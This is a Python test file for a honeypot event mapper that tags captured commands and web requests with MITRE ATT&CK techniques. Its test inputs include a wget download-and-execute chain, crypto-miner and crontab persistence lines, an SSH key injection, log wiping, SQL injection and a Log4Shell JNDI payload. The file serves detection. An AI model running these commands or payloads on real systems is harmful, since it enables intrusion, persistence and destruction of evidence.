from hivewatch.mitre import TACTICS, TECHNIQUES, map_event, techniques_for_command
from hivewatch.models import Event


def cmd(c: str) -> list[str]:
    return techniques_for_command(c)


def test_every_technique_belongs_to_a_known_tactic():
    assert all(t.tactic in TACTICS for t in TECHNIQUES.values())


def test_download_and_execute_chain():
    techs = cmd("cd /tmp; wget http://203.0.113.5/x86 -O x; chmod +x x; ./x")
    assert {"T1105", "T1222.002", "T1059.004"} <= set(techs)


def test_cryptominer_and_persistence():
    assert "T1496" in cmd("./xmrig -o stratum+tcp://pool.example:3333")
    assert "T1053.003" in cmd("(crontab -l; echo '* * * * * /tmp/x') | crontab -")
    assert "T1098.004" in cmd("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys")


def test_anti_forensics():
    assert "T1070.003" in cmd("history -c && unset HISTFILE")
    assert "T1070.002" in cmd("rm -rf /var/log/auth.log")


def test_discovery_commands():
    assert "T1082" in cmd("uname -a")
    assert "T1033" in cmd("whoami")
    assert "T1057" in cmd("ps aux")
    # 'ls' must not be confused with 'lscpu' (which is system info)
    assert "T1083" not in cmd("lscpu")


def test_event_level_mapping():
    base = dict(src_ip="1.2.3.4", dst_port=22)
    assert map_event(Event(sensor="ssh", event_type="login_failed", **base)) == ["T1110.001"]
    assert map_event(Event(sensor="ssh", event_type="login_success", **base)) == ["T1078"]
    assert map_event(Event(sensor="tcp", event_type="port_probe", **base)) == ["T1595"]


def test_web_requests():
    web = dict(sensor="http", event_type="http_request", src_ip="1.2.3.4", dst_port=80)
    assert map_event(Event(path="/index.php?id=1' OR '1'='1", **web)) == ["T1190"]
    assert map_event(Event(path="/?x=${jndi:ldap://evil/a}", **web)) == ["T1190"]
    assert map_event(Event(path="/.env", **web)) == ["T1595.003"]
    assert map_event(Event(path="/", **web)) == ["T1595"]
